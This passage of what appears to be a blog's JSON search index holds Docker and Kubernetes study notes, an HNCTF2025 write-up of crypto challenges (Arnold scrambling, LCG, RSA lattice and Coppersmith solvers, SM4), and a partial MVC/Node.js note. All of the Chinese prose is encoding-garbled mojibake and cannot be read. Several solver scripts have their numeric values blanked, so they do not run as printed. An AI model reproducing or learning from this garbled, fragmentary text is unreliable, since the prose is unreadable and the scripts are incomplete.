name: myapp image: registry.example.com/myapp:v1 ç„¶ååªè¦æŒ‡ä»¤éƒ¨ç½²å³å¯äº† kubectl apply -f myapp-deployment.yaml ","date":"2025-06-09","objectID":"/study-k8s/:6:2","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"ä¼˜ç‚¹ ä½œç”¨æ–¹é¢ é¦–å…ˆdockerå’Œk8såœ¨ä¸€å®šç¨‹åº¦ä¸Šçš„ä»»åŠ¡æ˜¯ä¸åŒçš„ å·¥å…· ä¸»è¦èŒè´£ ç±»ä¼¼æ¯”å–» Docker ç”¨æ¥æ„å»ºé•œåƒï¼Œæœ¬åœ°è¿è¡Œæµ‹è¯•å®¹å™¨ å·¥å‚ç”Ÿäº§äº§å“ Kubernetes ç®¡ç†å’Œç¼–æ’å®¹å™¨ï¼Œè‡ªåŠ¨éƒ¨ç½²ã€æ‰©ç¼©å®¹ã€æœåŠ¡å‘ç°ç­‰ ä»“åº“ + å¿«é€’è°ƒåº¦ç³»ç»Ÿ å¼€å‘/éƒ¨ç½²/è¿ç»´æ–¹é¢ æˆ‘åœ¨æœ¬åœ°è¿›è¡Œé¡¹ç›®å¼€å‘ï¼Œå®Œæˆåæ„å»ºdockerï¼Œç„¶åæ¨é€é•œåƒï¼Œäº‘ç«¯åªéœ€è¦å†™ä¸ª.yamlæ–‡ä»¶å°±å¯ä»¥éƒ¨ç½²äº†ï¼Œä½ è¯´çˆ½ä¸çˆ½ã€‚å¹¶ä¸”è¿™æ ·å¼€å‘åªç”¨åœ¨æ„dockerï¼Œè¿ç»´ä¹‹ç”¨åœ¨æ„k8sï¼Œå„å¸å…¶èŒ è‡ªåŠ¨åŒ– å¯ä»¥å®ç°è‡ªåŠ¨åŒ–æ¨é€éƒ¨ç½²æ›´æ–° å¼€å‘æäº¤ä»£ç  â†’ è‡ªåŠ¨æ„å»º Docker é•œåƒ â†’ è‡ªåŠ¨æ¨é€ â†’ K8s è‡ªåŠ¨æ›´æ–°éƒ¨ç½² ","date":"2025-06-09","objectID":"/study-k8s/:6:3","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"æœªå®Œç»“ å’•å’•å’• ","date":"2025-06-09","objectID":"/study-k8s/:7:0","tags":["å¼€å‘","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["å®¹å™¨"],"content":"ä¸­æ–‡æ–‡æ¡£ https://yeasy.gitbook.io/docker_practice ","date":"2025-06-09","objectID":"/study-docker/:1:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"å…³äºéƒ¨ç½² macå¯ä»¥ç”¨docker-desktopï¼Œæˆ–è€…æ˜¯orbstack(è¿™ä¸ªçœŸçš„å¥½ç”¨xd)ï¼Œlinuxå°±ç›´æ¥æŒ‡ä»¤æ“ä½œå§ã€‚winä¸æ¨èï¼Œæ¨èwslé‡Œé¢ædockerç„¶åæ˜ å°„å‡ºæ¥ ","date":"2025-06-09","objectID":"/study-docker/:2:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"åŸºæœ¬çŸ¥è¯† docker search nginx å¯»æ‰¾é•œåƒ æœ‰okçš„æ˜¯å®˜æ–¹çš„ docker pull nginx ç›´æ¥ä¸‹è½½ docker images æŸ¥çœ‹é•œåƒ docker hub é•œåƒä»“åº“ docker rmiåˆ é™¤é•œåƒ docker run è¿è¡Œ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] -d: åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDã€‚ -i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t ä¸€èµ·ä½¿ç”¨ã€‚ -t: åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚ -p HOST_PORT:CONTAINER_PORT: å°†ä¸»æœºçš„ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ç«¯å£ã€‚ -v HOST_DIR:CONTAINER_DIR: å°†ä¸»æœºç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ --name NAME: ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ã€‚ -e KEY=VALUE: è®¾ç½®ç¯å¢ƒå˜é‡ã€‚ ç¤ºä¾‹ è¿è¡Œå¸¦æœ‰äº¤äº’ç»ˆç«¯çš„ Ubuntu å®¹å™¨ï¼š docker run -it ubuntu åœ¨åå°è¿è¡Œ Nginx å®¹å™¨å¹¶æ˜ å°„ç«¯å£ï¼š docker run -d -p 8080:80 nginx æŒ‚è½½æœ¬åœ°ç›®å½•åˆ°å®¹å™¨ä¸­ï¼š docker run -v /local/path:/container/path my-image docker ps æŸ¥çœ‹å®¹å™¨ docker ps -a æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆåŒ…æ‹¬åœæ­¢çš„ï¼‰ docker stop åœæ­¢å®¹å™¨ docker rm åˆ é™¤å®¹å™¨ docker start å¯åŠ¨å®¹å™¨ docker stats æŸ¥çœ‹å®¹å™¨çŠ¶æ€ docker logs æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker exec è¿›å…¥å®¹å™¨ docker commit åˆ›å»ºé•œåƒ docker save ä¿å­˜ docker load åŠ è½½ docker inspect zsm_2 æŸ¥çœ‹å®¹å™¨ä¿¡æ¯(ä¸»è¦æ˜¯ip) docker network create åˆ›å»ºç½‘ç»œ --driver æŒ‡å®šç½‘ç»œé©±åŠ¨(é»˜è®¤æ˜¯bridge) --subnet æŒ‡å®šå­ç½‘ --gateway æŒ‡å®šç½‘å…³ --ip-range æŒ‡å®šipèŒƒå›´ --attachable æ˜¯å¦å…è®¸å®¹å™¨åŠ å…¥ç½‘ç»œ docker network rm my_custom_network åˆ é™¤ç½‘ç»œ docker run -d --name my_container --network my_custom_network nginx å¯åŠ¨å®¹å™¨æ—¶æŒ‡å®šç½‘ç»œ docker network connect my_custom_network my_container å°†è¿è¡Œçš„å®¹å™¨åŠ å…¥ç½‘ç»œ ","date":"2025-06-09","objectID":"/study-docker/:3:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"compose.yamlç¼–å†™ ","date":"2025-06-09","objectID":"/study-docker/:4:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"é¡¶çº§å…ƒç´  name # å®¹å™¨ç»„åç§° services # å®¹å™¨ç»„,æœåŠ¡ networks # ç½‘ç»œ volumes: # å· configs: # é…ç½® secrets: # å¯†é’¥ ","date":"2025-06-09","objectID":"/study-docker/:4:1","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"dockerfileç¼–å†™ FROM #æŒ‡å®šé•œåƒåŸºç¡€ç¯å¢ƒ RUN #è¿è¡Œè‡ªå®šä¹‰å‘½ä»¤ CMD #å®¹å™¨å¯åŠ¨å‘½ä»¤æˆ–è€…æ˜¯å‚æ•° LABEL #æ ‡ç­¾ EXPOSE #æš´éœ²ç«¯å£ ENV #ç¯å¢ƒå˜é‡ ADD #æ·»åŠ æ–‡ä»¶åˆ°é•œåƒ COPY #å¤åˆ¶æ–‡ä»¶åˆ°é•œåƒ ENTRYPOINT #å®¹å™¨å›ºå®šå¯åŠ¨å‘½ä»¤ WORKDIR #å·¥ä½œç›®å½• USER #ç”¨æˆ· VOLUME #æŒ‚è½½ç›®å½• ARG #å‚æ•° ","date":"2025-06-09","objectID":"/study-docker/:5:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"åŠ¨æ€ç«¯å£å®ç° åœ¨ctfé¢˜ç›®é‡Œé¢ï¼Œæ€»æœ‰ä¸€äº›é¢˜çš„ç¯å¢ƒæ‰“å¼€åå‘ç°ç«¯å£æ˜¯ä¸å®šçš„ï¼Œå°±æ˜¯è¿™æ ·å®ç°çš„ã€‚æƒ³gzctfå¹³å°ä¸Šé¢æ˜¯å·²ç»è‡ªåŠ¨å®ç°äº†ï¼Œè‡ªå·±ç»ƒä¹ çš„æ—¶å€™å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼å®ç° ","date":"2025-06-09","objectID":"/study-docker/:6:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"åŠ¨æ€ç«¯å£æ˜ å°„ version: \"3\" services: server: build: . restart: always ports: - \"2222-2232:2222\" # è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªç«¯å£èŒƒå›´ ","date":"2025-06-09","objectID":"/study-docker/:6:1","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"ç¯å¢ƒå˜é‡é…ç½®ç«¯å£ version: \"3\" services: server: build: . restart: always environment: SERVICE_PORT: 2222 # å®¹å™¨å†…æœåŠ¡ç›‘å¬çš„ç«¯å£ ports: - \"${HOST_PORT:-2222}:2222\" # å¤–éƒ¨ç«¯å£å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ HOST_PORT è®¾ç½® ","date":"2025-06-09","objectID":"/study-docker/:6:2","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"æ³¨æ„äº‹é¡¹ åœ¨ç”¨dockeræ‰“åŒ…ä¸€ä¸ªé¡¹ç›®æ—¶ï¼Œå¯ä»¥åˆ©ç”¨.dockerignoreæ–‡ä»¶ï¼ŒæŠŠä¸éœ€è¦ç›´æ¥æ‰“åŒ…çš„æ–‡ä»¶é™¤å»ï¼Œæ¯”å¦‚nodejsé¡¹ç›®çš„node_modulesæ–‡ä»¶å¤¹ç­‰ã€‚ è¿™æ ·çš„å¥½å¤„æ˜¯ï¼Œåœ¨dockerä¸­å»é…ç½®ç¯å¢ƒï¼Œé¿å…å†²çªï¼Œä¹Ÿé¿å…äº†æ‰“åŒ…æ—¶å› ä¸ºå†…å­˜å¤ªå¤§è€Œé€ æˆçš„é€Ÿåº¦å½±å“ ","date":"2025-06-09","objectID":"/study-docker/:7:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["å®¹å™¨"],"content":"æœªå®Œç»“ å’•å’•å’• ","date":"2025-06-09","objectID":"/study-docker/:8:0","tags":["å¼€å‘","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["CTF"],"content":"å‰è¨€ rank18 æˆ‘æ˜¯fw ","date":"2025-06-08","objectID":"/hnctf2025/:1:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-06-08","objectID":"/hnctf2025/:2:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"å“ˆåŸºcoke task.py import matplotlib.pyplot as plt import cv2 import numpy as np from PIL import Image def arnold_encode(image, shuffle_times, a, b): \"\"\" Arnold shuffle for rgb image Args: image: input original rgb image shuffle_times: how many times to shuffle Returns: Arnold encode image \"\"\" arnold_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = (1*ori_x + b*ori_y)% N new_y = (a*ori_x + (a*b+1)*ori_y) % N arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(arnold_image) cv2.imwrite('en_flag.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image img = cv2.imread('coke.png') arnold_encode(img,6,9,1) Arnoldå˜æ¢ï¼Œæˆ‘ä¸æ˜¯ç‰¹åˆ«æ‡‚åŸç†çš„ï¼Œgptä¸€æŠŠæ¢­äº† exp.py import cv2 import numpy as np def arnold_decode(image, shuffle_times, a, b): \"\"\" Arnold inverse shuffle for RGB image Args: image: input encoded RGB image shuffle_times: how many times it was shuffled Returns: Decoded image \"\"\" h, w = image.shape[:2] N = h arnold_image = np.zeros_like(image) # é€†Arnoldå˜æ¢çŸ©é˜µ for time in range(shuffle_times): for x in range(h): for y in range(w): ori_x = ((b * a + 1) * x - b * y) % N ori_y = (-a * x + y) % N arnold_image[ori_x, ori_y, :] = image[x, y, :] image = np.copy(arnold_image) cv2.imwrite('decoded_flag.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image # è§£å¯†ä¸»é€»è¾‘ encoded_img = cv2.imread('en_flag.png') decoded_img = arnold_decode(encoded_img, 6, 9, 1) ","date":"2025-06-08","objectID":"/hnctf2025/:2:1","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"lcgp task.py from Crypto.Util.number import * import gmpy2 import random import uuid n = getPrime(1024) flag = b'H\u0026NCTF{' + str(uuid.uuid4()).encode() + b'}' flag=bytes_to_long(flag) print(flag) e = 2024 c=pow(e, flag, n) class LCG: def __init__(self, seed, a, b, m): self.seed = seed self.a = a self.b = b self.m = m def generate(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed lcg = LCG(c, getPrime(256), getPrime(256), getPrime(2048)) random = [lcg.generate() for _ in range(5)] print(random) print(\"n=\",n) å‰é¢å°±æ˜¯å¾ˆæ­£å¸¸çš„LCGè§£å¯†ï¼Œç„¶åæ˜¯ä¸ªç®€å•çš„dlpé—®é¢˜ï¼Œå°±ä¸å¤šè¯´äº† exp.py from math import gcd from functools import reduce from Crypto.Util.number import inverse def recover_modulus(states): diffs = [s2 - s1 for s1, s2 in zip(states, states[1:])] zeroes = [] for i in range(len(diffs) - 2): x = diffs[i + 2] * diffs[i] - diffs[i + 1] ** 2 zeroes.append(abs(x)) return reduce(gcd, zeroes) def recover_lcg_params(states, m): s0, s1, s2 = states[:3] a = ((s2 - s1) * inverse(s1 - s0, m)) % m b = (s1 - a * s0) % m return a, b def recover_seed(states, a, b, m): s1 = states[0] seed = ((s1 - b) * inverse(a, m)) % m return seed states = [ ] m = recover_modulus(states) a, b = recover_lcg_params(states, m) c = recover_seed(states, a, b, m) print(\"[*] Recovered c =\", c) from Crypto.Util.number import long_to_bytes from sage.all import * n= cc= e = 2024 F = GF(n) g = F(2024) c = F(cc) flag_int = discrete_log(c, g) print(flag_int) print(long_to_bytes(flag_int)) ","date":"2025-06-08","objectID":"/hnctf2025/:2:2","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"æ•°æ®å¤„ç† task.py from Crypto.Util.number import bytes_to_long import random flag = b\"H\u0026NCTF{}\" btl = str(bytes_to_long(flag)) lowercase = '0123456789' uppercase = '7***4****5' table = ''.maketrans(lowercase, uppercase) new_flag = btl.translate(table) n = 2 ** 512 m = random.randint(2, n - 1) | 1 c = pow(m, int(new_flag), n) print('m = ' + str(m)) print('c = ' + str(c)) å‰é¢dlpï¼Œåé¢çˆ†ç ´ exp.py from Crypto.Util.number import long_to_bytes from sage.all import * m = cc = n = 2 ** 512 flag_int = discrete_log(cc, mod(m,n)) print(flag_int) from itertools import permutations from Crypto.Util.number import long_to_bytes new_flag = '' known_map = { '7': '0', '4': '4', '5': '9' } used_digits = {'0', '4', '9'} available_digits = [d for d in '0123456789' if d not in used_digits] unknown_chars = sorted(set(new_flag) - set(known_map.keys())) for perm in permutations(available_digits): full_map = dict(known_map) for ch, digit in zip(unknown_chars, perm): full_map[ch] = digit try: btl = ''.join(full_map[ch] for ch in new_flag) num = int(btl) flag = long_to_bytes(num) if flag.startswith(b'H\u0026NCTF{'): print(\"[+] æ‰¾åˆ°å•¦ï¼\") print(\"æ˜ å°„è¡¨ï¼š\", full_map) print(\"flag:\", flag) break except: continue ","date":"2025-06-08","objectID":"/hnctf2025/:2:3","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"ä¸ºä»€ä¹ˆå‡ºé¢˜äººçš„rsaæ€»æ˜¯ez task.py #part 1 def pad(flag, bits=1024): pad = os.urandom(bits//8 - len(flag)) return int.from_bytes(flag + pad, \"big\") p = random_prime(2**1024) q = random_prime(2**1024) a = randint(0, 2**1024) b = randint(0, 2**1024) n = p * q e = 0x10001 flag = b'' m = pad(flag) assert m \u003c n c = pow(m, e, n) print(f\"c={c}\") print(f\"n={n}\") print(f\"h1={p + b * q}\") print(f\"h2={a * p + q}\") #part 2 from Crypto.Util.number import * from gmpy2 import * a = random_prime() b = random_prime() g = random_prime() h = 2*g*a*b+a+b while not is_prime(h): a = random_prime() b = random_prime() g = random_prime() h = 2*g*a*b+a+b N = 2*h*g+1 e from part1's flag flag=b'' c=pow(bytes_to_long(flag),e,N) print(N) print(g) print(c) å‰é¢æ˜¯mapleç¥çš„åšå®¢çš„è„šæœ¬ï¼Œç›´æ¥æ¢­å“ˆï¼Œpart2å°±æ˜¯å¼ºç½‘é‚£ä¸ªï¼Œä»¥å‰çš„è„šæœ¬æ”¹æ”¹è¿˜èƒ½ç”¨ exp.py from sage.all import * from Crypto.Util.number import long_to_bytes from lll_cvp import solve_inequality c= n= x= y= # f(t,u)=(x-t)(y-u) # f(p,q)=0 (mod n) # f(t,u)=xy-ux-ty+tu=xy-ux-ty (mod n) # x, y ~ 2^1024 -\u003e LLL L = matrix([[n, 0, 0, 0], [x * y, 1, 0, 0], [-y, 0, 1, 0], [-x, 0, 0, 1]]) lb = [0, 1, 0, 0] ub = [0, 1, 2**1024, 2**1024] sol = solve_inequality(L, lb, ub) _, _, p, q = map(int, sol) assert p * q == n phi = (p - 1) * (q - 1) d = pow(0x10001, -1, phi) m = pow(c, d, n) print(long_to_bytes(m)) N= g= from sage.groups.generic import bsgs nbits = 2048 gamma = 0.244 cbits = ceil(nbits * (0.5 - 2 * gamma)) M = (N - 1) // (2 * g) u = M // (2 * g) v = M - 2 * g * u GF = Zmod(N) x = GF.random_element() y = x ^ (2 * g) # cçš„èŒƒå›´å¤§æ¦‚ä¸N^(0.5-2*gamma)å¾ˆæ¥è¿‘ c = bsgs(y, y ^ u, ((2**(cbits-5)), (2**(cbits+5)))) ab = u - c apb = v + 2 * g * c P.\u003cx\u003e = ZZ[] f = x ^ 2 - apb * x + ab a = f.roots() if a: a, b = a[0][0], a[1][0] p = 2 * g * a + 1 q = 2 * g * b + 1 assert p * q == N print(p,q) from Crypto.Util.number import* c= p= q= e=81733668723981020451323 n= phi=(p-1)*(q-1) print(pow(c,inverse(e,phi),n)) print(long_to_bytes(pow(c,inverse(e,phi),n))) ","date":"2025-06-08","objectID":"/hnctf2025/:2:4","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"factor task.py from Crypto.Util.number import * import uuid rbits = 248 Nbits = 1024 p = getPrime(Nbits // 2) q = getPrime(Nbits // 2) N = p * q r = getPrime(rbits) hint = getPrime(Nbits // 2) * p + r R = 2^rbits e=0x10001 n=p*q phi=(p-1)*(q-1) flag = b'H\u0026NCTF{' + str(uuid.uuid4()).encode() + b'}' m=bytes_to_long(flag) c=pow(m,e,n) print(\"N=\",N) print(\"hint=\",hint) print(c) æˆ‘æ˜¯çœŸçš„nmdä¸èƒ½ç†è§£å•Šæˆ‘é ï¼Œå†™çš„æ—¶å€™ç¬¬ä¸€æ—¶é—´æƒ³åˆ°copperå»æ‰“ï¼Œä¸€ç›´å‡ºä¸æ¥ï¼Œç„¶åæœ€åå‘ç°å¯èƒ½æ˜¯å‚æ•°å†™é”™äº†ï¼Ÿmdï¼ŒxdåºŸäº† ræ˜¯å°é‡ï¼Œåˆ©ç”¨copperæ‰“å‡ºæ¥ï¼Œç„¶åGCDæ±‚pï¼Œå³å¯æ±‚å‡ºflagï¼Œsmall_rootsé‡Œé¢çš„epsilonä¸€å®šè¦åŠ ä¸Šå•Šå•Šå•Šå•Šå•Šå•Š exp.py from Crypto.Util.number import* from sage.all import * N= hint= c= e=65537 rbits = 248 Nbits = 1024 R = 2^rbits PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=x-hint roots=f.small_roots(X=2^248,beta=0.4,epsilon=0.01) r=roots[0] print(r) r= p=GCD(hint-r,N) q=N//p phi=(p-1)*(q-1) print(long_to_bytes(pow(c,inverse(e,phi),N))) è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯AGCDï¼Œå‚è€ƒé¸¡å—ç¥çš„åšå®¢ï¼Œä½†æ˜¯é™åº¦å¤§æ¦‚åœ¨243bitså·¦å³ï¼Œéœ€è¦çˆ†ç ´5ä½ ","date":"2025-06-08","objectID":"/hnctf2025/:2:5","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"factor-pro task.py from Crypto.Util.number import * from Crypto.Util.Padding import * from gmssl.sm4 import CryptSM4, SM4_ENCRYPT from hashlib import sha256 from random import * import uuid rbits = 252 Nbits = 1024 p = getPrime(Nbits//2) q = getPrime(Nbits//2) N = p*q r = getPrime(rbits) hint = getPrime(Nbits// 2)*p+r R = 2^rbits flag = b'H\u0026NCTF{'+str(uuid.uuid4()).encode()+b'}' leak=p*q*r r_bytes = long_to_bytes(leak) iv = r_bytes[:16] if len(r_bytes) \u003e= 16 else r_bytes + b'\\0'*(16-len(r_bytes)) key = sha256(str(p + q + r).encode()).digest()[:16] crypt_sm4 = CryptSM4() crypt_sm4.set_key(key, SM4_ENCRYPT) padded_flag = pad(flag, 16) c = crypt_sm4.crypt_cbc(iv, padded_flag) print(\"N=\",N) print(\"hint=\",hint) print(c) ç®€å•æ¥è¯´å°±æ˜¯æŠŠä¸Šä¸€é¢˜å¤æ‚åŒ–äº†ï¼Œçœ‹åˆ°rå˜æˆäº†252bitsï¼Œçˆ†ç ´å‡ ä½å°±è¡Œäº†ï¼Œmdï¼Œåˆæ˜¯æ²¡å¸¦å‚æ•°ï¼Œæˆ‘æ˜¯sbï¼Œå®æµ‹æœ€ä½å¿…é¡»çˆ†12bits exp.py from Crypto.Util.number import* from sage.all import * from tqdm import* N = hint = rbits = 252 Nbits = 1024 R = 2^rbits high=12 for r in trange(2^high,-1,-1): rh=r\u003c\u003c(rbits-high) PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=hint-(rh+x) f=f.monic() roots=f.small_roots(X=2^(rbits-high)-1,beta=0.495,epsilon=0.03) if roots: rl=roots[0] print(rh+rl) break ","date":"2025-06-08","objectID":"/hnctf2025/:2:6","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"three vertical lines task.py from Crypto.Util.number import * from secret import flag from rsa.prime import getprime while(1): p=getprime(256) q=getprime(256) if isPrime(3*p**5+4*q**5): print(3*p**5+4*q**5) break e = 65537 print(pow(bytes_to_long(flag), e, p * q)) ä¿ºä¸ä¼šå•Šï¼Œèµ›åçŸ¥é“è¿™ä¸ªæ˜¯åŸé¢˜æ”¹çš„ï¼Œmdï¼Œå‚è€ƒloveçš„åšå®¢ï¼ŒåŸé¢˜æœ‰éé¢„æœŸï¼Œè¿™ä¸ªé¢˜è²Œä¼¼æ²¡æœ‰ï¼Œå½“æ—¶è¯•è¿‡ï¼ˆï¼‰ï¼Œæ‰“æ ¼å°±è¡Œäº†ï¼Œè¿™ç§æ„é€ çš„æ–¹æ³•æˆ‘è¿˜çœŸçš„æ²¡æœ‰æƒ³å‡ºæ¥ï¼Œå¥½nb exp.py from sage.all import Zmod, ZZ, matrix, inverse_mod, GF from functools import reduce import Crypto.Util.number as cun r= ct= e = 65537 # adwa solution R = Zmod(r)[\"x\"] x = R.gen() f = 3*x**5 + 4 root = f.roots()[0][0] M = matrix(ZZ, [[1, root], [0, r]]) # by adwa: # ä¼¼ä¹ ax^n + by^n, éƒ½å¯ä»¥ç”¨æ ¼è§£å†³ # f = x ** 7 - 7 # e = f.roots()[0][0] # å‹åŠ›æ¥åˆ°äº† roots å‡½æ•°, (å…¶å®å°±æ˜¯ä¸ªæœ‰é™åŸŸæ±‚æ ¹) b, a = map(abs, M.LLL()[0]) b, a = [int(i) for i in [a, b]] print(f\"a = {a}\\nb = {b}\") print(f\"{cun.isPrime(a) = }, {cun.isPrime(b) = }\") phi =(a-1)*(b-1) n = a * b d = cun.inverse(e, phi) m = pow(ct, d, n) print(f\"{m = }\") print(cun.long_to_bytes((m))) ","date":"2025-06-08","objectID":"/hnctf2025/:2:7","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"æ€»ç»“ è‡ªå·±æœ‰ç‚¹sbï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œmd ","date":"2025-06-08","objectID":"/hnctf2025/:3:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["nodejs"],"content":"å‰è¨€ å‰é¢çš„nodejsã€Œ3ã€å…¶å®å†™è¿‡ï¼Œä½†æ˜¯å¾ˆæ½¦è‰ä¸”ä¸æ·±åˆ»ï¼Œè¿™ä¸ªç¨å¾®æ·±åˆ»ä¸€ç‚¹ ","date":"2025-06-06","objectID":"/thinking-mvc/:1:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"ä»€ä¹ˆæ˜¯MVC ä¸‰ä¸ªå­—æ¯å¯¹åº”ä¸‰ä¸ªå•è¯ï¼Œå¯¹åº”ä¸‰ä¸ªå±‚æ¬¡ M-\u003eModel V-\u003eView C-\u003eControl åœ¨æˆ‘æµ…è–„çš„ç†è§£ä¸‹ï¼ŒModelå±‚æ˜¯å¯¹äºæ•°æ®åº“å»å»ºç«‹sqlæ¨¡å‹ï¼Œä»¥åŠå¢åˆ æŸ¥æ”¹ç­‰æ“ä½œã€‚Controlå»ä½œä¸ºMå’ŒVä¹‹é—´çš„ä¸­é—´ä»¶ï¼Œå»è¡”æ¥è´¯é€šï¼Œå¹¶ä¸”åœ¨æˆ‘çš„ç†è§£é‡Œé¢ï¼Œè¿™ä¸ªä¸åº”è¯¥å«æœ‰webå±‚é¢çš„ä¸šåŠ¡é€»è¾‘(ä¸‹å•ï¼Œæ”¯ä»˜ç­‰æ“ä½œ)ã€‚è€ŒViewå°±æ˜¯ä¸å‰ç«¯è¿›è¡Œäº¤äº’ï¼Œå¾—åˆ°orå‘é€çŠ¶æ€/æ•°æ®ç­‰ä¿¡æ¯ã€‚ é‚£ä¹ˆwebå±‚é¢çš„é€»è¾‘å°±åº”è¯¥äº¤ç»™Serviceså±‚å»å®Œæˆï¼Œè¡ç”Ÿå‡ºæ¥çš„DTOå±‚ï¼Œç”¨äºC-\u003eSæ—¶çš„æ•°æ®å¤„ç†ä»¥åŠè§„èŒƒï¼Œæœ‰è¶£çš„æ˜¯ä»–åªæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œä¸èƒ½å¤„ç†å¤æ‚çš„é€»è¾‘ï¼Œæ¯”å¦‚æƒé™ç®¡ç†ï¼Œå¢åŠ wafç­‰ï¼Œæˆ‘ç¬¬ä¸€å¼€å§‹çœŸçš„æƒ³è¿‡åœ¨è¿™é‡Œå»åŠ wafä¿è¯å®‰å…¨(å¦‚xssï¼Œsqlæ³¨å…¥ç­‰) ","date":"2025-06-06","objectID":"/thinking-mvc/:2:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC\u0026ä¼ ç»Ÿæ€æƒ³çš„ä¸åŒ ç”»å›¾å¥½åƒå¯ä»¥è¡¨ç°çš„æ›´åŠ ç›´æ¥ åœ¨æˆ‘çš„ç†è§£é‡Œï¼Œä¼ ç»Ÿæ€æƒ³çš„å¤„ç†æ–¹å¼å°±æ˜¯ä¸€ä¸ªä»»åŠ¡å¯¹åº”ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚ç”¨æˆ·åˆ›å»ºä¸ªäººä¿¡æ¯æ—¶æˆ‘éœ€è¦ä¸€ä¸ªæ–‡ä»¶ï¼Œæ›´æ–°ä¸ªäººä¿¡æ¯æ—¶éœ€è¦å¦ä¸€ä¸ªæ–‡ä»¶å»å¤„ç†ï¼Œé‚£ä¹ˆè¿™æ ·çš„åå¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Œåœ¨è¿›è¡Œç±»ä¼¼æ“ä½œæ—¶ï¼Œæˆ‘éœ€è¦åœ¨ä¸åŒçš„æ–‡ä»¶é‡Œé¢å†™å…¥ç›¸åŒçš„å‡½æ•°ï¼Œæ¯”å¦‚uploadæ“ä½œï¼Œè€Œæˆ‘åœ¨æ—¥åç»´æŠ¤æ—¶ï¼Œéœ€è¦è‡ªå·±å»ä¸€ä¸ªä¸€ä¸ªä¿®æ”¹ï¼Œè¿™å°±æ˜¯ç¼ºç‚¹äº† è€ŒMVCå°±åœ¨å¤„ç†è¿™ç§æƒ…å†µã€‚ è¿™é‡Œç”¨nodejs+expressä¸¾ä¾‹å§(çœŸå¯¹javaä¸ç†Ÿxd)ï¼Œè¿™é‡Œå‰åç«¯åˆ†ç¦»çš„ï¼ŒCå±‚å°±ä¸å†™äº† import mongoose from \"mongoose\"; mongoose.connect(\"mongodb://127.0.0.1:27017/company-system\", { useNewUrlParser: true, useUnifiedTopology: true, }); const db = mongoose.connection; db.on(\"error\", (err) =\u003e { console.error(\"âŒ MongoDB connection error:\", err); }); db.once(\"open\", () =\u003e { console.log(\"âœ… MongoDB connected successfully!\"); }); export default db; import UserService from '../../services/admin/UserService.js' getList: 